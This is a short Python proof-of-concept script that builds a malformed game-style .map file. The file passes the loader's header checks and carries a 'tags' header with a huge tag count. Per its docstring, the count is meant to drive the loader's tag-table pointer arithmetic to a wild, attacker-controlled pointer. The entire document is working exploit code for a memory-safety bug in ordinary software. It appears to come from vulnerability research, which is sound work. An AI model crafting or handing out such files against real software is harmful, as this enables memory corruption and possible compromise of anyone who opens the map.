#!/usr/bin/env python3
"""Craft a .map that passes the header checks, uses VALID (non-overflowing)
section sizes so the first/second reads land cleanly in g_tagmem, and places a
valid in-buffer 'tags' header at g_tagmem+V carrying a MALICIOUS tag count.
Goal: drive the real loader PAST the 'tags' validation into the tag-table
pointer math at 0x6c9c4c (rcx = g_tags + 12*tagcount + 32) and observe the wild
pointer built from the attacker count.  Usage: mk_tagcount.py <real.map> <out.map>"""
import sys, struct

real=open(sys.argv[1],"rb").read(0x380)
ALIGN=lambda v:((v|0x7f)+1)&0xffffffff if (v&0x7f) else v&0xffffffff

V      = 0x1000       # +0x2d0 virtual base (tags live at g_tagmem+V)
A14    = 0x2000       # +0x14  -> alloc tail; alloc = V + align128(A14) = 0x3000
SZ2D4  = 0x1000       # +0x2d4 -> read1 size (fits: V+0x1000 = 0x2000 <= 0x3000)
OFF10  = 0x1000       # +0x10  -> read1 file offset (section-A at file 0x1000)
D2D8   = 0x100        # +0x2d8 -> read2 placement/size (stays in bounds)
TAGCNT = 0x20000000   # malicious tag count -> 12*cnt = 0x180000000 (wild pointer)

b=bytearray(real)
f1c=struct.unpack_from("<I",b,0x1c)[0] & ~1
for off,val in {0x1c:f1c,0x14:A14,0x2d0:V,0x2d4:SZ2D4,0x10:OFF10,0x2d8:D2D8,
                0x28:0x400,0x24:0x2200,0x20:0x40,0x2c:0x2400}.items():
    struct.pack_into("<i",b,off,val)

# file body: section-A at OFF10 must become a 'tags' header at g_tagmem+V:
#   [V+0x04]=tagcount  [V+0x08]!=0  [V+0x18]>0  [V+0x1c]='tags'
end=max(OFF10+ALIGN(SZ2D4), 0x2400+0x400, 0x380)
buf=bytearray(b) + bytearray(b"\x00"*(end-0x380))
def put32(fileoff,val): struct.pack_into("<I",buf,fileoff,val & 0xffffffff)
base=OFF10                      # section-A copied to g_tagmem+V byte-for-byte
put32(base+0x1c, 0x74616773)    # 'tags'
put32(base+0x04, TAGCNT)        # tag count (malicious)
put32(base+0x08, 0x40)          # [tags+8] != 0
put32(base+0x18, 0x40)          # [tags+0x18] > 0
open(sys.argv[2],"wb").write(buf)
print(f"wrote {sys.argv[2]} ({len(buf)} bytes); V={V:#x} tagcount={TAGCNT:#x} "
      f"-> expect ptr = g_tags + 12*{TAGCNT:#x} + 32 = g_tagmem+{V+12*TAGCNT+32:#x}")
